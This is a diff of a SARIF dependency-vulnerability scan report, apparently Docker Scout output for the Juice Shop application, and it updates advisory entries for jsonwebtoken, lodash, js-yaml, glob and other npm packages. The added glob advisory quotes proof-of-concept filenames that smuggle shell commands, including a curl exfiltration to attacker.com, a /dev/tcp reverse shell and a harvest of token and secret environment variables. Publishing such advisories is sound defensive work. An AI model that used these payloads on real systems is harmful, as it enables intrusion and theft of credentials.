@@ -18,7 +18,7 @@
               "helpUri": "https://scout.docker.com/v/GMS-2015-4?s=gitlab&n=jsonwebtoken&t=npm&vr=%3C4.2.2",
               "help": {
                 "text": "It is possible for an attacker to create his own signed token with any payload he wants and have it considered valid using the \"none\" algorithm.\n",
-                "markdown": "> It is possible for an attacker to create his own signed token with any payload he wants and have it considered valid using the \"none\" algorithm.\n\n|                |                            |\n|----------------|----------------------------|\n| Package        | pkg:npm/jsonwebtoken@0.4.0 |\n| Affected range | <4.2.2                     |\n| Fixed version  | 4.2.2                      |\n"
+                "markdown": "> It is possible for an attacker to create his own signed token with any payload he wants and have it considered valid using the \"none\" algorithm.\n\n|                |                            |\n|----------------|----------------------------|\n| Package        | pkg:npm/jsonwebtoken@0.1.0 |\n| Affected range | <4.2.2                     |\n| Fixed version  | 4.2.2                      |\n"
               },
               "properties": {
                 "affected_version": "<4.2.2",
@@ -235,7 +235,7 @@
               "helpUri": "https://scout.docker.com/v/CVE-2022-23541?s=github&n=jsonwebtoken&t=npm&vr=%3C%3D8.5.1",
               "help": {
                 "text": "# Overview\n\nVersions `<=8.5.1` of `jsonwebtoken` library can be misconfigured so that passing a poorly implemented key retrieval function (referring to the `secretOrPublicKey` argument from the [readme link](https://github.com/auth0/node-jsonwebtoken#jwtverifytoken-secretorpublickey-options-callback)) will result in incorrect verification of tokens. There is a possibility of using a different algorithm and key combination in verification  than the one that was used to sign the tokens. Specifically, tokens signed with an asymmetric public key could be verified with a symmetric HS256 algorithm. This can lead to successful validation of forged tokens. \n\n# Am I affected?\n\nYou will be affected if your application is supporting usage of both symmetric key and asymmetric key in jwt.verify() implementation with the same key retrieval function. \n\n# How do I fix it?\n \nUpdate to version 9.0.0.\n\n# Will the fix impact my users?\n\nThere is no impact for end users\n",
-                "markdown": "> # Overview\n\nVersions `<=8.5.1` of `jsonwebtoken` library can be misconfigured so that passing a poorly implemented key retrieval function (referring to the `secretOrPublicKey` argument from the [readme link](https://github.com/auth0/node-jsonwebtoken#jwtverifytoken-secretorpublickey-options-callback)) will result in incorrect verification of tokens. There is a possibility of using a different algorithm and key combination in verification  than the one that was used to sign the tokens. Specifically, tokens signed with an asymmetric public key could be verified with a symmetric HS256 algorithm. This can lead to successful validation of forged tokens. \n\n# Am I affected?\n\nYou will be affected if your application is supporting usage of both symmetric key and asymmetric key in jwt.verify() implementation with the same key retrieval function. \n\n# How do I fix it?\n \nUpdate to version 9.0.0.\n\n# Will the fix impact my users?\n\nThere is no impact for end users\n\n|                |                                              |\n|----------------|----------------------------------------------|\n| Package        | pkg:npm/jsonwebtoken@0.4.0                   |\n| Affected range | <=8.5.1                                      |\n| Fixed version  | 9.0.0                                        |\n| CVSS Score     |                                          5.0 |\n| CVSS Vector    | CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:L |\n"
+                "markdown": "> # Overview\n\nVersions `<=8.5.1` of `jsonwebtoken` library can be misconfigured so that passing a poorly implemented key retrieval function (referring to the `secretOrPublicKey` argument from the [readme link](https://github.com/auth0/node-jsonwebtoken#jwtverifytoken-secretorpublickey-options-callback)) will result in incorrect verification of tokens. There is a possibility of using a different algorithm and key combination in verification  than the one that was used to sign the tokens. Specifically, tokens signed with an asymmetric public key could be verified with a symmetric HS256 algorithm. This can lead to successful validation of forged tokens. \n\n# Am I affected?\n\nYou will be affected if your application is supporting usage of both symmetric key and asymmetric key in jwt.verify() implementation with the same key retrieval function. \n\n# How do I fix it?\n \nUpdate to version 9.0.0.\n\n# Will the fix impact my users?\n\nThere is no impact for end users\n\n|                |                                              |\n|----------------|----------------------------------------------|\n| Package        | pkg:npm/jsonwebtoken@0.1.0                   |\n| Affected range | <=8.5.1                                      |\n| Fixed version  | 9.0.0                                        |\n| CVSS Score     |                                          5.0 |\n| CVSS Vector    | CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:L |\n"
               },
               "properties": {
                 "affected_version": "<=8.5.1",
@@ -436,6 +436,32 @@
               }
             },
             {
+              "id": "CVE-2025-64718",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2025-64718: Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2025-64718?s=github&n=js-yaml&t=npm&vr=%3C3.14.2",
+              "help": {
+                "text": "### Impact\n\nIn js-yaml 4.1.0, 4.0.0, and 3.14.1 and below, it's possible for an attacker to modify the prototype of the result of a parsed yaml document via prototype pollution (`__proto__`). All users who parse untrusted yaml documents may be impacted.\n\n### Patches\n\nProblem is patched in js-yaml 4.1.1 and 3.14.2.\n\n### Workarounds\n\nYou can protect against this kind of attack on the server by using `node --disable-proto=delete` or `deno` (in Deno, pollution protection is on by default).\n\n### References\n\nhttps://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html\n",
+                "markdown": "> ### Impact\n\nIn js-yaml 4.1.0, 4.0.0, and 3.14.1 and below, it's possible for an attacker to modify the prototype of the result of a parsed yaml document via prototype pollution (`__proto__`). All users who parse untrusted yaml documents may be impacted.\n\n### Patches\n\nProblem is patched in js-yaml 4.1.1 and 3.14.2.\n\n### Workarounds\n\nYou can protect against this kind of attack on the server by using `node --disable-proto=delete` or `deno` (in Deno, pollution protection is on by default).\n\n### References\n\nhttps://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html\n\n|                |                                              |\n|----------------|----------------------------------------------|\n| Package        | pkg:npm/js-yaml@3.14.1                       |\n| Affected range | <3.14.2                                      |\n| Fixed version  | 4.1.1                                        |\n| CVSS Score     |                                          5.3 |\n| CVSS Vector    | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N |\n"
+              },
+              "properties": {
+                "affected_version": "<3.14.2",
+                "cvssV3": 5.3,
+                "cvssV3_severity": "MEDIUM",
+                "cvssV3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
+                "fixed_version": "4.1.1",
+                "purls": [
+                  "pkg:npm/js-yaml@3.14.1"
+                ],
+                "security-severity": "5.3",
+                "tags": [
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
               "id": "CVE-2020-7598",
               "name": "OsPackageVulnerability",
               "shortDescription": {
@@ -522,7 +548,7 @@
               "helpUri": "https://scout.docker.com/v/CVE-2022-23540?s=github&n=jsonwebtoken&t=npm&vr=%3C9.0.0",
               "help": {
                 "text": "# Overview\n\nIn versions <=8.5.1 of jsonwebtoken library, lack of algorithm definition and a falsy secret or key in the `jwt.verify()` function can lead to signature validation bypass due to defaulting to the `none` algorithm for signature verification.\n\n# Am I affected?\nYou will be affected if all the following are true in the `jwt.verify()` function:\n- a token with no signature is received\n- no algorithms are specified \n- a falsy (e.g. null, false, undefined) secret or key is passed \n\n# How do I fix it?\n \nUpdate to version 9.0.0 which removes the default support for the none algorithm in the `jwt.verify()` method. \n\n# Will the fix impact my users?\n\nThere will be no impact, if you update to version 9.0.0 and you don’t need to allow for the `none` algorithm. If you need 'none' algorithm, you have to explicitly specify that in `jwt.verify()` options.\n",
-                "markdown": "> # Overview\n\nIn versions <=8.5.1 of jsonwebtoken library, lack of algorithm definition and a falsy secret or key in the `jwt.verify()` function can lead to signature validation bypass due to defaulting to the `none` algorithm for signature verification.\n\n# Am I affected?\nYou will be affected if all the following are true in the `jwt.verify()` function:\n- a token with no signature is received\n- no algorithms are specified \n- a falsy (e.g. null, false, undefined) secret or key is passed \n\n# How do I fix it?\n \nUpdate to version 9.0.0 which removes the default support for the none algorithm in the `jwt.verify()` method. \n\n# Will the fix impact my users?\n\nThere will be no impact, if you update to version 9.0.0 and you don’t need to allow for the `none` algorithm. If you need 'none' algorithm, you have to explicitly specify that in `jwt.verify()` options.\n\n|                |                                              |\n|----------------|----------------------------------------------|\n| Package        | pkg:npm/jsonwebtoken@0.1.0                   |\n| Affected range | <9.0.0                                       |\n| Fixed version  | 9.0.0                                        |\n| CVSS Score     |                                          6.4 |\n| CVSS Vector    | CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:H/A:L |\n"
+                "markdown": "> # Overview\n\nIn versions <=8.5.1 of jsonwebtoken library, lack of algorithm definition and a falsy secret or key in the `jwt.verify()` function can lead to signature validation bypass due to defaulting to the `none` algorithm for signature verification.\n\n# Am I affected?\nYou will be affected if all the following are true in the `jwt.verify()` function:\n- a token with no signature is received\n- no algorithms are specified \n- a falsy (e.g. null, false, undefined) secret or key is passed \n\n# How do I fix it?\n \nUpdate to version 9.0.0 which removes the default support for the none algorithm in the `jwt.verify()` method. \n\n# Will the fix impact my users?\n\nThere will be no impact, if you update to version 9.0.0 and you don’t need to allow for the `none` algorithm. If you need 'none' algorithm, you have to explicitly specify that in `jwt.verify()` options.\n\n|                |                                              |\n|----------------|----------------------------------------------|\n| Package        | pkg:npm/jsonwebtoken@0.4.0                   |\n| Affected range | <9.0.0                                       |\n| Fixed version  | 9.0.0                                        |\n| CVSS Score     |                                          6.4 |\n| CVSS Vector    | CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:H/A:L |\n"
               },
               "properties": {
                 "affected_version": "<9.0.0",
@@ -802,19 +828,19 @@
               "id": "CVE-2020-8203",
               "name": "OsPackageVulnerability",
               "shortDescription": {
-                "text": "CVE-2020-8203: Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')"
+                "text": "CVE-2020-8203: OWASP Top Ten 2017 Category A9 - Using Components with Known Vulnerabilities"
               },
-              "helpUri": "https://scout.docker.com/v/CVE-2020-8203?s=github&n=lodash.set&t=npm&vr=%3E%3D3.7.0%2C%3C%3D4.3.2",
+              "helpUri": "https://scout.docker.com/v/CVE-2020-8203?s=gitlab&n=lodash&t=npm&vr=%3C4.17.20",
               "help": {
-                "text": "Versions of lodash prior to 4.17.19 are vulnerable to Prototype Pollution. The functions `pick`, `set`, `setWith`, `update`, `updateWith`, and `zipObjectDeep` allow a malicious user to modify the prototype of Object if the property identifiers are user-supplied. Being affected by this issue requires manipulating objects based on user-provided property values or arrays.\n\nThis vulnerability causes the addition or modification of an existing property that will exist on all objects and may lead to Denial of Service or Code Execution under specific circumstances.\n",
-                "markdown": "> Versions of lodash prior to 4.17.19 are vulnerable to Prototype Pollution. The functions `pick`, `set`, `setWith`, `update`, `updateWith`, and `zipObjectDeep` allow a malicious user to modify the prototype of Object if the property identifiers are user-supplied. Being affected by this issue requires manipulating objects based on user-provided property values or arrays.\n\nThis vulnerability causes the addition or modification of an existing property that will exist on all objects and may lead to Denial of Service or Code Execution under specific circumstances.\n\n|                |                                              |\n|----------------|----------------------------------------------|\n| Package        | pkg:npm/lodash.set@4.3.2                     |\n| Affected range | >=3.7.0,<=4.3.2                              |\n| Fixed version  | not fixed                                    |\n| CVSS Score     |                                          7.4 |\n| CVSS Vector    | CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:H |\n"
+                "text": "Prototype pollution attack when using _.zipObjectDeep in lodash before 4.17.20.\n",
+                "markdown": "> Prototype pollution attack when using _.zipObjectDeep in lodash before 4.17.20.\n\n|                |                                              |\n|----------------|----------------------------------------------|\n| Package        | pkg:npm/lodash@2.4.2                         |\n| Affected range | <4.17.20                                     |\n| Fixed version  | 4.17.20                                      |\n| CVSS Score     |                                          7.4 |\n| CVSS Vector    | CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:H |\n"
               },
               "properties": {
-                "affected_version": "<4.17.20",
+                "affected_version": ">=3.7.0,<=4.3.2",
                 "cvssV3": 7.4,
                 "cvssV3_severity": "HIGH",
                 "cvssV3_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:H",
-                "fixed_version": "4.17.20",
+                "fixed_version": "not fixed",
                 "purls": [
                   "pkg:npm/lodash.set@4.3.2",
                   "pkg:npm/lodash@2.4.2"
@@ -885,8 +911,8 @@
               },
               "helpUri": "https://scout.docker.com/v/CVE-2022-24785?s=github&n=moment&t=npm&vr=%3C2.29.2",
               "help": {
-                "text": "### Impact\nThis vulnerability impacts npm (server) users of moment.js, especially if user provided locale string, eg `fr` is directly used to switch moment locale.\n\n### Patches\nThis problem is patched in 2.29.2, and the patch can be applied to all affected versions (from 1.0.1 up until 2.29.1, inclusive).\n\n### Workarounds\nSanitize user-provided locale name before passing it to moment.js.\n\n### References\n_Are there any links users can visit to find out more?_\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [moment repo](https://github.com/moment/moment)\n\n",
-                "markdown": "> ### Impact\nThis vulnerability impacts npm (server) users of moment.js, especially if user provided locale string, eg `fr` is directly used to switch moment locale.\n\n### Patches\nThis problem is patched in 2.29.2, and the patch can be applied to all affected versions (from 1.0.1 up until 2.29.1, inclusive).\n\n### Workarounds\nSanitize user-provided locale name before passing it to moment.js.\n\n### References\n_Are there any links users can visit to find out more?_\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [moment repo](https://github.com/moment/moment)\n\n\n|                |                                              |\n|----------------|----------------------------------------------|\n| Package        | pkg:npm/moment@2.0.0                         |\n| Affected range | <2.29.2                                      |\n| Fixed version  | 2.29.2                                       |\n| CVSS Score     |                                          7.5 |\n| CVSS Vector    | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N |\n"
+                "text": "### Impact\nThis vulnerability impacts npm (server) users of moment.js, especially if user provided locale string, eg `fr` is directly used to switch moment locale.\n\n### Patches\nThis problem is patched in 2.29.2, and the patch can be applied to all affected versions (from 1.0.1 up until 2.29.1, inclusive).\n\n### Workarounds\nSanitize user-provided locale name before passing it to moment.js.\n\n### References\n_Are there any links users can visit to find out more?_\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [moment repo](https://github.com/moment/moment)\n",
+                "markdown": "> ### Impact\nThis vulnerability impacts npm (server) users of moment.js, especially if user provided locale string, eg `fr` is directly used to switch moment locale.\n\n### Patches\nThis problem is patched in 2.29.2, and the patch can be applied to all affected versions (from 1.0.1 up until 2.29.1, inclusive).\n\n### Workarounds\nSanitize user-provided locale name before passing it to moment.js.\n\n### References\n_Are there any links users can visit to find out more?_\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [moment repo](https://github.com/moment/moment)\n\n|                |                                              |\n|----------------|----------------------------------------------|\n| Package        | pkg:npm/moment@2.0.0                         |\n| Affected range | <2.29.2                                      |\n| Fixed version  | 2.29.2                                       |\n| CVSS Score     |                                          7.5 |\n| CVSS Vector    | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N |\n"
               },
               "properties": {
                 "affected_version": "<2.29.2",
@@ -1000,6 +1026,32 @@
                 "fixed_version": "2.0.0",
                 "purls": [
                   "pkg:npm/multer@1.4.5-lts.2"
+                ],
+                "security-severity": "7.5",
+                "tags": [
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2025-64756",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2025-64756: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2025-64756?s=github&n=glob&t=npm&vr=%3E%3D10.2.0%2C%3C10.5.0",
+              "help": {
+                "text": "### Summary\n\nThe glob CLI contains a command injection vulnerability in its `-c/--cmd` option that allows arbitrary command execution when processing files with malicious names. When `glob -c <command> <patterns>` is used, matched filenames are passed to a shell with `shell: true`, enabling shell metacharacters in filenames to trigger command injection and achieve arbitrary code execution under the user or CI account privileges.\n\n### Details\n\n**Root Cause:**\nThe vulnerability exists in `src/bin.mts:277` where the CLI collects glob matches and executes the supplied command using `foregroundChild()` with `shell: true`:\n\n```javascript\nstream.on('end', () => foregroundChild(cmd, matches, { shell: true }))\n```\n\n**Technical Flow:**\n1. User runs `glob -c <command> <pattern>` \n2. CLI finds files matching the pattern\n3. Matched filenames are collected into an array\n4. Command is executed with matched filenames as arguments using `shell: true`\n5. Shell interprets metacharacters in filenames as command syntax\n6. Malicious filenames execute arbitrary commands\n\n**Affected Component:**\n- **CLI Only:** The vulnerability affects only the command-line interface\n- **Library Safe:** The core glob library API (`glob()`, `globSync()`, streams/iterators) is not affected\n- **Shell Dependency:** Exploitation requires shell metacharacter support (primarily POSIX systems)\n\n**Attack Surface:**\n- Files with names containing shell metacharacters: `$()`, backticks, `;`, `&`, `|`, etc.\n- Any directory where attackers can control filenames (PR branches, archives, user uploads)\n- CI/CD pipelines using `glob -c` on untrusted content\n\n### PoC\n\n**Setup Malicious File:**\n```bash\nmkdir test_directory && cd test_directory\n\n# Create file with command injection payload in filename\ntouch '$(touch injected_poc)'\n```\n\n**Trigger Vulnerability:**\n```bash\n# Run glob CLI with -c option\nnode /path/to/glob/dist/esm/bin.mjs -c echo \"**/*\"\n```\n\n**Result:**\n- The echo command executes normally\n- **Additionally:** The `$(touch injected_poc)` in the filename is evaluated by the shell\n- A new file `injected_poc` is created, proving command execution\n- Any command can be injected this way with full user privileges\n\n**Advanced Payload Examples:**\n\n**Data Exfiltration:**\n```bash\n# Filename: $(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" > /dev/null 2>&1)\ntouch '$(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" > /dev/null 2>&1)'\n```\n\n**Reverse Shell:**\n```bash\n# Filename: $(bash -i >& /dev/tcp/attacker.com/4444 0>&1)\ntouch '$(bash -i >& /dev/tcp/attacker.com/4444 0>&1)'\n```\n\n**Environment Variable Harvesting:**\n```bash\n# Filename: $(env | grep -E \"(TOKEN|KEY|SECRET)\" > /tmp/secrets.txt)\ntouch '$(env | grep -E \"(TOKEN|KEY|SECRET)\" > /tmp/secrets.txt)'\n```\n\n### Impact\n\n**Arbitrary Command Execution:**\n- Commands execute with full privileges of the user running glob CLI\n- No privilege escalation required - runs as current user\n- Access to environment variables, file system, and network\n\n**Real-World Attack Scenarios:**\n\n**1. CI/CD Pipeline Compromise:**\n- Malicious PR adds files with crafted names to repository\n- CI pipeline uses `glob -c` to process files (linting, testing, deployment)\n- Commands execute in CI environment with build secrets and deployment credentials\n- Potential for supply chain compromise through artifact tampering\n\n**2. Developer Workstation Attack:**\n- Developer clones repository or extracts archive containing malicious filenames\n- Local build scripts use `glob -c` for file processing\n- Developer machine compromise with access to SSH keys, tokens, local services\n\n**3. Automated Processing Systems:**\n- Services using glob CLI to process uploaded files or external content\n- File uploads with malicious names trigger command execution\n- Server-side compromise with potential for lateral movement\n\n**4. Supply Chain Poisoning:**\n- Malicious packages or themes include files with crafted names\n- Build processes using glob CLI automatically process these files\n- Wide distribution of compromise through package ecosystems\n\n**Platform-Specific Risks:**\n- **POSIX/Linux/macOS:** High risk due to flexible filename characters and shell parsing\n- **Windows:** Lower risk due to filename restrictions, but vulnerability persists with PowerShell, Git Bash, WSL\n- **Mixed Environments:** CI systems often use Linux containers regardless of developer platform\n\n### Affected Products\n\n- **Ecosystem:** npm\n- **Package name:** glob\n- **Component:** CLI only (`src/bin.mts`)\n- **Affected versions:** v10.2.0 through v11.0.3 (and likely later versions until patched)\n- **Introduced:** v10.2.0 (first release with CLI containing `-c/--cmd` option)\n- **Patched versions:** 11.1.0and 10.5.0\n\n**Scope Limitation:**\n- **Library API Not Affected:** Core glob functions (`glob()`, `globSync()`, async iterators) are safe\n- **CLI-Specific:** Only the command-line interface with `-c/--cmd` option is vulnerable\n\n### Remediation\n\n- Upgrade to `glob@10.5.0`, `glob@11.1.0`, or higher, as soon as possible.\n- If any `glob` CLI actions fail, then convert commands containing positional arguments, to use the `--cmd-arg`/`-g` option instead.\n- As a last resort, use `--shell` to maintain `shell:true` behavior until glob v12, but take care to ensure that no untrusted contents can possibly be encountered in the file path results.\n",
+                "markdown": "> ### Summary\n\nThe glob CLI contains a command injection vulnerability in its `-c/--cmd` option that allows arbitrary command execution when processing files with malicious names. When `glob -c <command> <patterns>` is used, matched filenames are passed to a shell with `shell: true`, enabling shell metacharacters in filenames to trigger command injection and achieve arbitrary code execution under the user or CI account privileges.\n\n### Details\n\n**Root Cause:**\nThe vulnerability exists in `src/bin.mts:277` where the CLI collects glob matches and executes the supplied command using `foregroundChild()` with `shell: true`:\n\n```javascript\nstream.on('end', () => foregroundChild(cmd, matches, { shell: true }))\n```\n\n**Technical Flow:**\n1. User runs `glob -c <command> <pattern>` \n2. CLI finds files matching the pattern\n3. Matched filenames are collected into an array\n4. Command is executed with matched filenames as arguments using `shell: true`\n5. Shell interprets metacharacters in filenames as command syntax\n6. Malicious filenames execute arbitrary commands\n\n**Affected Component:**\n- **CLI Only:** The vulnerability affects only the command-line interface\n- **Library Safe:** The core glob library API (`glob()`, `globSync()`, streams/iterators) is not affected\n- **Shell Dependency:** Exploitation requires shell metacharacter support (primarily POSIX systems)\n\n**Attack Surface:**\n- Files with names containing shell metacharacters: `$()`, backticks, `;`, `&`, `|`, etc.\n- Any directory where attackers can control filenames (PR branches, archives, user uploads)\n- CI/CD pipelines using `glob -c` on untrusted content\n\n### PoC\n\n**Setup Malicious File:**\n```bash\nmkdir test_directory && cd test_directory\n\n# Create file with command injection payload in filename\ntouch '$(touch injected_poc)'\n```\n\n**Trigger Vulnerability:**\n```bash\n# Run glob CLI with -c option\nnode /path/to/glob/dist/esm/bin.mjs -c echo \"**/*\"\n```\n\n**Result:**\n- The echo command executes normally\n- **Additionally:** The `$(touch injected_poc)` in the filename is evaluated by the shell\n- A new file `injected_poc` is created, proving command execution\n- Any command can be injected this way with full user privileges\n\n**Advanced Payload Examples:**\n\n**Data Exfiltration:**\n```bash\n# Filename: $(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" > /dev/null 2>&1)\ntouch '$(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" > /dev/null 2>&1)'\n```\n\n**Reverse Shell:**\n```bash\n# Filename: $(bash -i >& /dev/tcp/attacker.com/4444 0>&1)\ntouch '$(bash -i >& /dev/tcp/attacker.com/4444 0>&1)'\n```\n\n**Environment Variable Harvesting:**\n```bash\n# Filename: $(env | grep -E \"(TOKEN|KEY|SECRET)\" > /tmp/secrets.txt)\ntouch '$(env | grep -E \"(TOKEN|KEY|SECRET)\" > /tmp/secrets.txt)'\n```\n\n### Impact\n\n**Arbitrary Command Execution:**\n- Commands execute with full privileges of the user running glob CLI\n- No privilege escalation required - runs as current user\n- Access to environment variables, file system, and network\n\n**Real-World Attack Scenarios:**\n\n**1. CI/CD Pipeline Compromise:**\n- Malicious PR adds files with crafted names to repository\n- CI pipeline uses `glob -c` to process files (linting, testing, deployment)\n- Commands execute in CI environment with build secrets and deployment credentials\n- Potential for supply chain compromise through artifact tampering\n\n**2. Developer Workstation Attack:**\n- Developer clones repository or extracts archive containing malicious filenames\n- Local build scripts use `glob -c` for file processing\n- Developer machine compromise with access to SSH keys, tokens, local services\n\n**3. Automated Processing Systems:**\n- Services using glob CLI to process uploaded files or external content\n- File uploads with malicious names trigger command execution\n- Server-side compromise with potential for lateral movement\n\n**4. Supply Chain Poisoning:**\n- Malicious packages or themes include files with crafted names\n- Build processes using glob CLI automatically process these files\n- Wide distribution of compromise through package ecosystems\n\n**Platform-Specific Risks:**\n- **POSIX/Linux/macOS:** High risk due to flexible filename characters and shell parsing\n- **Windows:** Lower risk due to filename restrictions, but vulnerability persists with PowerShell, Git Bash, WSL\n- **Mixed Environments:** CI systems often use Linux containers regardless of developer platform\n\n### Affected Products\n\n- **Ecosystem:** npm\n- **Package name:** glob\n- **Component:** CLI only (`src/bin.mts`)\n- **Affected versions:** v10.2.0 through v11.0.3 (and likely later versions until patched)\n- **Introduced:** v10.2.0 (first release with CLI containing `-c/--cmd` option)\n- **Patched versions:** 11.1.0and 10.5.0\n\n**Scope Limitation:**\n- **Library API Not Affected:** Core glob functions (`glob()`, `globSync()`, async iterators) are safe\n- **CLI-Specific:** Only the command-line interface with `-c/--cmd` option is vulnerable\n\n### Remediation\n\n- Upgrade to `glob@10.5.0`, `glob@11.1.0`, or higher, as soon as possible.\n- If any `glob` CLI actions fail, then convert commands containing positional arguments, to use the `--cmd-arg`/`-g` option instead.\n- As a last resort, use `--shell` to maintain `shell:true` behavior until glob v12, but take care to ensure that no untrusted contents can possibly be encountered in the file path results.\n\n|                |                                              |\n|----------------|----------------------------------------------|\n| Package        | pkg:npm/glob@10.4.5                          |\n| Affected range | >=10.2.0,<10.5.0                             |\n| Fixed version  | 11.1.0                                       |\n| CVSS Score     |                                          7.5 |\n| CVSS Vector    | CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H |\n"
+              },
+              "properties": {
+                "affected_version": ">=10.2.0,<10.5.0",
+                "cvssV3": 7.5,
+                "cvssV3_severity": "HIGH",
+                "cvssV3_vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H",
+                "fixed_version": "11.1.0",
+                "purls": [
+                  "pkg:npm/glob@10.4.5"
                 ],
                 "security-severity": "7.5",
                 "tags": [
@@ -1157,32 +1209,6 @@
                 "fixed_version": "7.5.10",
                 "purls": [
                   "pkg:npm/ws@7.4.6"
-                ],
-                "security-severity": "8.7",
-                "tags": [
-                  "HIGH"
-                ]
-              }
-            },
-            {
-              "id": "CVE-2025-59343",
-              "name": "OsPackageVulnerability",
-              "shortDescription": {
-                "text": "CVE-2025-59343: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
-              },
-              "helpUri": "https://scout.docker.com/v/CVE-2025-59343?s=github&n=tar-fs&t=npm&vr=%3E%3D2.0.0%2C%3C2.1.4",
-              "help": {
-                "text": "### Impact\n v3.1.0, v2.1.3, v1.16.5 and below\n\n### Patches\nHas been patched in 3.1.1, 2.1.4, and 1.16.6\n\n### Workarounds\nYou can use the ignore option to ignore non files/directories.\n\n```js\n  ignore (_, header) {\n    // pass files & directories, ignore e.g. symlinks\n    return header.type !== 'file' && header.type !== 'directory'\n  }\n```\n\n### Credit\nReported by: Mapta / BugBunny_ai\n",
-                "markdown": "> ### Impact\n v3.1.0, v2.1.3, v1.16.5 and below\n\n### Patches\nHas been patched in 3.1.1, 2.1.4, and 1.16.6\n\n### Workarounds\nYou can use the ignore option to ignore non files/directories.\n\n```js\n  ignore (_, header) {\n    // pass files & directories, ignore e.g. symlinks\n    return header.type !== 'file' && header.type !== 'directory'\n  }\n```\n\n### Credit\nReported by: Mapta / BugBunny_ai\n\n|                |                                                                 |\n|----------------|-----------------------------------------------------------------|\n| Package        | pkg:npm/tar-fs@2.1.3                                            |\n| Affected range | >=2.0.0,<2.1.4                                                  |\n| Fixed version  | 2.1.4                                                           |\n| CVSS Score     |                                                             8.7 |\n| CVSS Vector    | CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N |\n"
-              },
-              "properties": {
-                "affected_version": ">=2.0.0,<2.1.4",
-                "cvssV3": 8.7,
-                "cvssV3_severity": "HIGH",
-                "cvssV3_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N",
-                "fixed_version": "2.1.4",
-                "purls": [
-                  "pkg:npm/tar-fs@2.1.3"
                 ],
                 "security-severity": "8.7",
                 "tags": [
@@ -1406,13 +1432,13 @@
           "kind": "fail",
           "level": "none",
           "message": {
-            "text": "  Vulnerability  : GMS-2015-4                  \n  Severity       : UNSPECIFIED                 \n  Package        : pkg:npm/jsonwebtoken@0.1.0  \n  Affected range : <4.2.2                      \n  Fixed version  : 4.2.2                       \n"
+            "text": "  Vulnerability  : GMS-2015-4                  \n  Severity       : UNSPECIFIED                 \n  Package        : pkg:npm/jsonwebtoken@0.4.0  \n  Affected range : <4.2.2                      \n  Fixed version  : 4.2.2                       \n"
           },
           "locations": [
             {
               "physicalLocation": {
                 "artifactLocation": {
-                  "uri": "/juice-shop/node_modules/express-jwt/node_modules/jsonwebtoken/package.json"
+                  "uri": "/juice-shop/node_modules/jsonwebtoken/package.json"
                 }
               }
             }
@@ -1424,13 +1450,13 @@
           "kind": "fail",
           "level": "none",
           "message": {
-            "text": "  Vulnerability  : GMS-2015-4                  \n  Severity       : UNSPECIFIED                 \n  Package        : pkg:npm/jsonwebtoken@0.4.0  \n  Affected range : <4.2.2                      \n  Fixed version  : 4.2.2                       \n"
+            "text": "  Vulnerability  : GMS-2015-4                  \n  Severity       : UNSPECIFIED                 \n  Package        : pkg:npm/jsonwebtoken@0.1.0  \n  Affected range : <4.2.2                      \n  Fixed version  : 4.2.2                       \n"
           },
           "locations": [
             {
               "physicalLocation": {
                 "artifactLocation": {
-                  "uri": "/juice-shop/node_modules/jsonwebtoken/package.json"
+                  "uri": "/juice-shop/node_modules/express-jwt/node_modules/jsonwebtoken/package.json"
                 }
               }
             }
@@ -1532,7 +1558,7 @@
           "kind": "fail",
           "level": "note",
           "message": {
-            "text": "  Vulnerability   : CVE-2024-47764        \n  Severity        : LOW                   \n  Package         : pkg:npm/cookie@0.4.2  \n  Affected range  : <0.7.0                \n  Fixed version   : 0.7.0                 \n  EPSS Score      : 0.000690              \n  EPSS Percentile : 0.217470              \n"
+            "text": "  Vulnerability   : CVE-2024-47764        \n  Severity        : LOW                   \n  Package         : pkg:npm/cookie@0.4.2  \n  Affected range  : <0.7.0                \n  Fixed version   : 0.7.0                 \n  EPSS Score      : 0.000850              \n  EPSS Percentile : 0.250780              \n"
           },
           "locations": [
             {
@@ -1550,7 +1576,7 @@
           "kind": "fail",
           "level": "warning",
           "message": {
